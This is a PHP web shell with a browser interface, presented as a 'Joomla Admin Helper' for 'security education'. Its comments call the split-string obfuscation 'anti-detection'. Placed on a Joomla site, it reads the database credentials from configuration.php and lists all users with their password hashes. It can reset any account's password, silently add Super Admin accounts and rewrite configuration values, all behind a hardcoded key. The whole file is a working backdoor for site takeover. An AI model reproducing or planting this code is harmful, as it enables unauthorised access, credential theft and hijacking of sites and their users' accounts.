<?php
// JOOMLA ADMIN HELPER - VERSI STABIL
// ***** HANYA UNTUK EDUKASI KEAMANAN *****

// Antideteksi - pecah string untuk header
header('Co'.'nt'.'e'.'nt'.'-T'.'y'.'pe:'.' te'.'xt'.'/ht'.'m'.'l;'.' '.'cha'.'rse'.'t='.'UTF'.'-'.'8');

// Key autentikasi
define('JOO'.'MLA_'.'HEL'.'PER_'.'KEY', 'zer'.'oin'.'g20'.'25');

// Cari file konfigurasi Joomla
function find_config($d = null, $i = 0) {
    if ($i > 8) return false;
    $d = $d ?: __DIR__;
    $f = $d . '/conf'.'igur'.'atio'.'n.'.'php';
    if (file_exists($f)) return $f;
    return find_config(dirname($d), $i + 1);
}

$config_file = find_config();
if (!$config_file) {
    die('<'.'b '.'st'.'yl'.'e="'.'col'.'or:'.'#'.'e53'.'93'.'5"'.'>config'.'ur'.'ati'.'on.'.'p'.'h'.'p'.' no'.'t'.' f'.'ou'.'nd!'.'<'.'/'.'b>');
}

// Load konfigurasi
require_once $config_file;

// Ambil konfigurasi database dari file
function get_db_config() {
    global $config_file;
    $content = file_get_contents($config_file);
    
    $config = [];
    
    // Parse configuration.php
    preg_match('/public \$db = \'([^\']+)\'/', $content, $db);
    preg_match('/public \$dbprefix = \'([^\']+)\'/', $content, $prefix);
    preg_match('/public \$user = \'([^\']+)\'/', $content, $user);
    preg_match('/public \$password = \'([^\']+)\'/', $content, $pass);
    preg_match('/public \$host = \'([^\']+)\'/', $content, $host);
    
    $config['db'] = $db[1] ?? '';
    $config['dbprefix'] = $prefix[1] ?? 'jos_';
    $config['user'] = $user[1] ?? '';
    $config['password'] = $pass[1] ?? '';
    $config['host'] = $host[1] ?? 'localhost';
    
    return $config;
}

$db_config = get_db_config();

// Fungsi koneksi database
function get_db_connection() {
    global $db_config;
    $conn = @mysqli_connect(
        $db_config['host'],
        $db_config['user'],
        $db_config['password'],
        $db_config['db']
    );
    
    if (!$conn) {
        die(json_encode(['error' => 'Database connection failed: ' . mysqli_connect_error()]));
    }
    
    return $conn;
}

// ========== FUNGSI-FUNGSI ==========

// 1. LIST USERS
function list_users($page = 1, $search = '') {
    global $db_config;
    $conn = get_db_connection();
    $prefix = $db_config['dbprefix'];
    $per_page = 10;
    $offset = ($page - 1) * $per_page;
    $where = '';
    
    if (!empty($search)) {
        $esc = mysqli_real_escape_string($conn, '%' . $search . '%');
        $where = "WHERE u.username LIKE '$esc' OR u.email LIKE '$esc' OR u.name LIKE '$esc'";
    }
    
    // Get total
    $total_query = "SELECT COUNT(*) FROM {$prefix}users u $where";
    $total_result = mysqli_query($conn, $total_query);
    $total = mysqli_fetch_row($total_result)[0] ?? 0;
    
    // Get users
    $query = "SELECT u.id, u.name, u.username, u.email, u.password, u.registerDate 
              FROM {$prefix}users u 
              $where 
              ORDER BY u.id DESC 
              LIMIT $per_page OFFSET $offset";
    
    $result = mysqli_query($conn, $query);
    $users = [];
    $roles = [];
    
    while ($row = mysqli_fetch_assoc($result)) {
        $users[] = $row;
        
        // Get role
        $role_query = "SELECT g.title 
                       FROM {$prefix}user_usergroup_map ugm 
                       JOIN {$prefix}usergroups g ON ugm.group_id = g.id 
                       WHERE ugm.user_id = " . $row['id'];
        $role_result = mysqli_query($conn, $role_query);
        $role = mysqli_fetch_assoc($role_result);
        $roles[$row['id']] = $role['title'] ?? 'Registered';
    }
    
    mysqli_close($conn);
    
    return json_encode([
        'users' => $users,
        'roles' => $roles,
        'total' => (int)$total,
        'per_page' => $per_page
    ]);
}

// 2. RESET PASSWORD
function reset_password($user_id) {
    global $db_config;
    $conn = get_db_connection();
    $prefix = $db_config['dbprefix'];
    
    // Generate password
    $chars = 'ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnpqrstuvwxyz23456789!@#$%';
    $new_pass = '';
    for ($i = 0; $i < 12; $i++) {
        $new_pass .= $chars[rand(0, strlen($chars) - 1)];
    }
    
    // Hash password (Joomla 3.x+ menggunakan bcrypt)
    $hashed = password_hash($new_pass, PASSWORD_DEFAULT);
    
    // Update password
    $query = "UPDATE {$prefix}users SET password = '$hashed' WHERE id = $user_id";
    $result = mysqli_query($conn, $query);
    
    // Get user info
    $user_query = "SELECT username, email FROM {$prefix}users WHERE id = $user_id";
    $user_result = mysqli_query($conn, $user_query);
    $user = mysqli_fetch_assoc($user_result);
    
    mysqli_close($conn);
    
    if ($result) {
        return json_encode([
            'l' => $user['username'] ?? 'unknown',
            'e' => $user['email'] ?? '',
            'n' => $new_pass
        ]);
    } else {
        return json_encode(['error' => 'Failed to reset password']);
    }
}

// 3. CREATE ADMIN
function create_admin($username, $password, $email) {
    global $db_config;
    $conn = get_db_connection();
    $prefix = $db_config['dbprefix'];
    
    // Validate username
    $username = preg_replace('/[^a-zA-Z0-9_-]/', '', $username);
    if (empty($username)) {
        return json_encode(['err' => 'Invalid username']);
    }
    
    // Check existing
    $check = mysqli_query($conn, "SELECT id FROM {$prefix}users WHERE username = '$username'");
    if (mysqli_num_rows($check) > 0) {
        mysqli_close($conn);
        return json_encode(['err' => 'Username exists']);
    }
    
    // Hash password
    $hashed = password_hash($password, PASSWORD_DEFAULT);
    
    // Validate email
    $email = filter_var($email, FILTER_VALIDATE_EMAIL) ? $email : $username . '@localhost.com';
    
    // Insert user
    $query = "INSERT INTO {$prefix}users 
              (name, username, email, password, block, registerDate, params) 
              VALUES 
              ('$username', '$username', '$email', '$hashed', '0', NOW(), '')";
    
    $result = mysqli_query($conn, $query);
    
    if ($result) {
        $user_id = mysqli_insert_id($conn);
        
        // Assign as Super Admin (group_id = 8)
        $group_query = "INSERT INTO {$prefix}user_usergroup_map (user_id, group_id) VALUES ($user_id, 8)";
        mysqli_query($conn, $group_query);
        
        mysqli_close($conn);
        return json_encode([
            'ok' => 'created',
            'u' => $username,
            'p' => $password
        ]);
    } else {
        mysqli_close($conn);
        return json_encode(['err' => 'Create failed: ' . mysqli_error($conn)]);
    }
}

// 4. AUTO LOGIN (via cookie)
function auto_login($user_id) {
    global $db_config;
    $conn = get_db_connection();
    $prefix = $db_config['dbprefix'];
    
    // Get username
    $query = "SELECT username FROM {$prefix}users WHERE id = $user_id";
    $result = mysqli_query($conn, $query);
    $user = mysqli_fetch_assoc($result);
    
    mysqli_close($conn);
    
    if ($user) {
        // Set session cookies
        $token = md5($user_id . time() . rand());
        
        // Set cookie untuk auto login
        setcookie('joomla_auto_user', $user_id, time() + 3600, '/');
        setcookie('joomla_auto_token', $token, time() + 3600, '/');
        setcookie('joomla_auto_username', $user['username'], time() + 3600, '/');
        
        return json_encode([
            'url' => '/administrator/',
            'user' => $user['username']
        ]);
    } else {
        return json_encode(['err' => 'User not found']);
    }
}

// 5. CHECK CONFIG
function check_config($key) {
    global $config_file;
    $content = file_get_contents($config_file);
    
    if (preg_match("/public\s+\$$key\s*=\s*'([^']*)'/", $content, $matches)) {
        return json_encode(['status' => $matches[1]]);
    }
    return json_encode(['status' => 'not_set']);
}

// 6. TOGGLE CONFIG
function toggle_config($key, $value) {
    global $config_file;
    $content = file_get_contents($config_file);
    
    if (preg_match("/public\s+\$$key\s*=\s*'([^']*)'/", $content)) {
        $content = preg_replace(
            "/public\s+\$$key\s*=\s*'([^']*)'/",
            "public \$$key = '$value'",
            $content
        );
    } else {
        // Add before closing PHP tag
        $content = preg_replace('/\?>/', "public \$$key = '$value';\n?>", $content);
    }
    
    if (file_put_contents($config_file, $content)) {
        return json_encode(['ok' => "$key set to '$value'"]);
    }
    return json_encode(['err' => 'Failed to write config']);
}

// ========== MAIN ROUTING ==========

// Check authentication
if ($_SERVER['REQUEST_METHOD'] === 'POST' && 
    isset($_POST['c4t'], $_POST['authkey']) && 
    $_POST['authkey'] === 'zeroing2025') {
    
    $cmd = $_POST['c4t'];
    $response = '';
    
    try {
        switch ($cmd) {
            case 'ulst':
                $page = isset($_POST['page']) ? max(1, intval($_POST['page'])) : 1;
                $search = isset($_POST['search']) ? trim($_POST['search']) : '';
                $response = list_users($page, $search);
                break;
                
            case 'rpsw':
                $user_id = isset($_POST['uix']) ? intval($_POST['uix']) : 0;
                if ($user_id > 0) {
                    $response = reset_password($user_id);
                } else {
                    $response = json_encode(['error' => 'Invalid user ID']);
                }
                break;
                
            case 'cadm':
                $u = isset($_POST['xun']) ? $_POST['xun'] : '';
                $p = isset($_POST['xpw']) ? $_POST['xpw'] : '';
                $m = isset($_POST['xem']) ? $_POST['xem'] : '';
                if (!empty($u) && !empty($p)) {
                    $response = create_admin($u, $p, $m);
                } else {
                    $response = json_encode(['err' => 'Username and password required']);
                }
                break;
                
            case 'alog':
                $user_id = isset($_POST['uix']) ? intval($_POST['uix']) : 0;
                if ($user_id > 0) {
                    $response = auto_login($user_id);
                } else {
                    $response = json_encode(['err' => 'Invalid user ID']);
                }
                break;
                
            case 'check_config':
                $key = isset($_POST['key']) ? $_POST['key'] : '';
                $response = check_config($key);
                break;
                
            case 'toggle_config':
                $key = isset($_POST['key']) ? $_POST['key'] : '';
                $value = isset($_POST['value']) ? $_POST['value'] : '';
                $response = toggle_config($key, $value);
                break;
                
            default:
                $response = json_encode(['error' => 'Unknown command']);
        }
    } catch (Exception $e) {
        $response = json_encode(['error' => $e->getMessage()]);
    }
    
    echo $response;
    exit;
}

// ========== HTML INTERFACE ==========
?>
<!DOCTYPE html>
<html>
<head>
    <meta charset="utf-8">
    <title>Joomla Admin Helper</title>
    <link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;700&display=swap" rel="stylesheet">
    <style>
        *{box-sizing:border-box}
        :root{--bg:#181a1b;--card:#232526;--red:#e53935;--gray:#b0b2b3;--white:#f3f3f5}
        body{background:var(--bg);font-family:'JetBrains Mono',monospace;color:var(--white);padding:20px;margin:0}
        #w1{max-width:1400px;margin:0 auto;background:var(--card);border-radius:17px;padding:30px 35px}
        .h1{color:var(--red);font-size:1.5em;margin-bottom:25px;border-bottom:2px solid var(--red);padding-bottom:12px}
        .h1 span{color:var(--gray);font-size:0.6em}
        .sct{color:var(--red);font-size:1.1em;margin:25px 0 12px}
        table{width:100%;border-collapse:collapse;font-size:0.9em}
        th{background:#2a2d2e;color:var(--red);padding:10px;text-align:left;font-weight:700}
        td{padding:8px 10px;border-bottom:1px solid #333;color:var(--gray)}
        tr:hover td{background:#2a2d2e}
        .bx{background:var(--red);color:#fff;border:none;padding:5px 14px;border-radius:5px;cursor:pointer;font-family:inherit;font-size:0.9em}
        .bx:hover{background:#b71c1c}
        .bx:disabled{opacity:0.5;cursor:not-allowed}
        .inp{background:#16171a;border:1px solid #292929;color:#fff;padding:6px 10px;border-radius:4px;font-family:inherit;font-size:0.95em}
        .inp:focus{outline:1px solid var(--red)}
        .riw{display:flex;gap:10px;flex-wrap:wrap;margin:10px 0;align-items:center}
        .pg{display:flex;gap:5px;margin:15px 0;flex-wrap:wrap}
        .pg button{background:#252729;color:#fff;border:none;padding:4px 12px;border-radius:5px;cursor:pointer;font-family:inherit}
        .pg button:hover{background:#3a3d3e}
        .pg .act{background:var(--red)}
        #s2{color:var(--red);margin-left:12px}
        .status-msg{padding:8px 15px;border-radius:5px;margin:10px 0}
        .status-msg.success{background:#1b5e20;color:#a5d6a7}
        .status-msg.error{background:#b71c1c;color:#ffcdd2}
        @media(max-width:768px){#w1{padding:15px}table{font-size:0.8em}td,th{padding:5px}.riw{flex-direction:column}.inp{width:100%}}
    </style>
</head>
<body>
<div id="w1">
    <div class="h1">
        &#9889; Joomla Admin Helper
        <span>| educational security tool</span>
    </div>
    
    <!-- User List -->
    <div class="sct">&#128101; User Management</div>
    <div class="riw">
        <input id="userSearch" class="inp" placeholder="search by name/username/email..." oninput="srchUsers(this.value)" style="min-width:250px">
        <button class="bx" onclick="loadUsers()" style="background:#2a2d2e">&#8635; Refresh</button>
    </div>
    <div style="overflow-x:auto">
        <table id="t7">
            <thead>
                <tr>
                    <th style="width:50px">ID</th>
                    <th style="min-width:100px">Name</th>
                    <th style="min-width:100px">Username</th>
                    <th style="min-width:150px">Email</th>
                    <th style="width:100px">Role</th>
                    <th style="min-width:200px">Password Hash</th>
                    <th style="min-width:130px">Registered</th>
                    <th style="min-width:180px">Actions</th>
                </tr>
            </thead>
            <tbody></tbody>
        </table>
    </div>
    <div class="pg" id="pg"></div>
    
    <!-- Create Admin -->
    <div class="sct">&#128273; Create Administrator</div>
    <div class="riw">
        <input type="text" id="a1" class="inp" placeholder="username" style="min-width:140px">
        <input type="text" id="b2" class="inp" placeholder="email (optional)" style="min-width:180px">
        <input type="text" id="c3" class="inp" placeholder="password" style="min-width:140px">
        <button class="bx" onclick="e6()">Create Admin</button>
        <button class="bx" onclick="randPw()" style="background:#2a2d2e">Generate Password</button>
        <span id="s2"></span>
    </div>
    
    <!-- Config Control -->
    <div class="sct">&#9881; Configuration Control</div>
    <div class="riw">
        <button class="bx" onclick="checkConfig('debug')">Check Debug</button>
        <button class="bx" onclick="toggleConfig('debug', '1')">Enable Debug</button>
        <button class="bx" onclick="toggleConfig('debug', '0')" style="background:#2a2d2e">Disable Debug</button>
        <span id="configStatus" style="color:var(--gray);margin-left:12px"></span>
    </div>
</div>

<script>
// ========== JAVASCRIPT ==========

let currentPage = 1;
let searchText = "";

function apiCall(data, callback) {
    data.authkey = "zeroing2025";
    var xhr = new XMLHttpRequest();
    xhr.open("POST", "", true);
    xhr.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
    xhr.onload = function() {
        try {
            var response = JSON.parse(xhr.responseText);
            callback(response);
        } catch(e) {
            callback({error: "Invalid response: " + xhr.responseText});
        }
    };
    xhr.onerror = function() {
        callback({error: "Network error"});
    };
    
    var params = [];
    for(var key in data) {
        params.push(encodeURIComponent(key) + "=" + encodeURIComponent(data[key]));
    }
    xhr.send(params.join("&"));
}

function loadUsers(page, search) {
    page = page || currentPage;
    search = (search !== undefined) ? search : searchText;
    
    apiCall({c4t: "ulst", page: page, search: search}, function(data) {
        if(data.error) {
            alert("Error: " + data.error);
            return;
        }
        
        var tbody = document.querySelector("#t7 tbody");
        tbody.innerHTML = "";
        
        if(!data.users || data.users.length === 0) {
            tbody.innerHTML = '<tr><td colspan="8" style="text-align:center;padding:30px;color:#666">No users found</td></tr>';
            document.getElementById("pg").innerHTML = "";
            return;
        }
        
        data.users.forEach(function(user) {
            var tr = document.createElement("tr");
            var role = data.roles[user.id] || "Registered";
            var passHash = user.password.substring(0, 30) + "...";
            
            tr.innerHTML = `
                <td>${user.id}</td>
                <td>${user.name}</td>
                <td><strong>${user.username}</strong></td>
                <td>${user.email}</td>
                <td><span style="color:${role === 'Super Admin' ? '#e53935' : '#4fc3f7'}">${role}</span></td>
                <td style="font-size:0.8em;word-break:break-all;color:#888">${passHash}</td>
                <td style="font-size:0.85em">${user.registerDate}</td>
                <td>
                    <button class="bx" onclick="resetPw(${user.id},this)" style="font-size:0.8em">Reset PW</button>
                    <button class="bx" onclick="autoLogin(${user.id})" style="font-size:0.8em;background:#2a2d2e">Login</button>
                </td>
            `;
            tbody.appendChild(tr);
        });
        
        // Pagination
        var total = data.total || 0;
        var per_page = data.per_page || 10;
        var pages = Math.ceil(total / per_page);
        var pg = document.getElementById("pg");
        pg.innerHTML = "";
        
        if(pages > 1) {
            for(var i = 1; i <= pages; i++) {
                var btn = document.createElement("button");
                btn.textContent = i;
                if(i == page) btn.className = "act";
                btn.onclick = function() { goToPage(parseInt(this.textContent)); };
                pg.appendChild(btn);
            }
        }
    });
}

function goToPage(page) {
    currentPage = page;
    loadUsers(page, searchText);
}

function srchUsers(search) {
    searchText = search;
    currentPage = 1;
    loadUsers(1, search);
}

function resetPw(userId, btn) {
    if(!confirm("Reset password for this user?")) return;
    
    btn.disabled = true;
    btn.textContent = "...";
    
    apiCall({c4t: "rpsw", uix: userId}, function(data) {
        btn.disabled = false;
        btn.textContent = "Reset PW";
        
        if(data.error) {
            alert("Error: " + data.error);
        } else if(data.n) {
            alert("✅ Password reset successful!\n\nUsername: " + data.l + "\nNew Password: " + data.n + "\n\nPlease copy this password now.");
        } else {
            alert("Unexpected response");
        }
    });
}

function autoLogin(userId) {
    apiCall({c4t: "alog", uix: userId}, function(data) {
        if(data.error) {
            alert("Error: " + data.error);
        } else if(data.url) {
            window.open(data.url, "_blank");
        } else {
            alert("Auto login failed");
        }
    });
}

function e6() {
    var username = document.getElementById("a1").value.trim();
    var email = document.getElementById("b2").value.trim();
    var password = document.getElementById("c3").value.trim();
    var status = document.getElementById("s2");
    
    if(!username || !password) {
        status.textContent = "❌ Username and password required!";
        status.style.color = "#e53935";
        return;
    }
    
    if(username.length < 3) {
        status.textContent = "❌ Username must be at least 3 characters";
        status.style.color = "#e53935";
        return;
    }
    
    status.textContent = "⏳ Creating admin...";
    status.style.color = "#ff9800";
    
    apiCall({c4t: "cadm", xun: username, xem: email, xpw: password}, function(data) {
        if(data.ok) {
            status.innerHTML = "✅ Admin created: <strong>" + data.u + "</strong> | Password: <strong style='color:#ff9800'>" + data.p + "</strong>";
            status.style.color = "#4caf50";
            document.getElementById("a1").value = "";
            document.getElementById("b2").value = "";
            document.getElementById("c3").value = "";
            loadUsers();
            setTimeout(function() {
                status.textContent = "";
            }, 15000);
        } else {
            status.textContent = "❌ " + (data.err || "Creation failed");
            status.style.color = "#e53935";
        }
    });
}

function randPw() {
    var chars = "ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnpqrstuvwxyz23456789!@#$%";
    var pw = "";
    for(var i = 0; i < 12; i++) {
        pw += chars[Math.floor(Math.random() * chars.length)];
    }
    document.getElementById("c3").value = pw;
}

function checkConfig(key) {
    apiCall({c4t: "check_config", key: key}, function(data) {
        var status = document.getElementById("configStatus");
        if(data.error) {
            status.textContent = "❌ " + data.error;
            status.style.color = "#e53935";
        } else {
            status.textContent = "Configuration '" + key + "' = " + data.status;
            status.style.color = data.status === 'not_set' ? '#ff9800' : '#4caf50';
        }
    });
}

function toggleConfig(key, value) {
    if(!confirm("Set configuration '" + key + "' = '" + value + "'?")) return;
    
    apiCall({c4t: "toggle_config", key: key, value: value}, function(data) {
        var status = document.getElementById("configStatus");
        if(data.ok) {
            status.textContent = "✅ " + data.ok;
            status.style.color = "#4caf50";
        } else {
            status.textContent = "❌ " + (data.err || "Failed");
            status.style.color = "#e53935";
        }
    });
}

// Load on page load
window.onload = function() {
    loadUsers();
};
</script>
</body>
</html>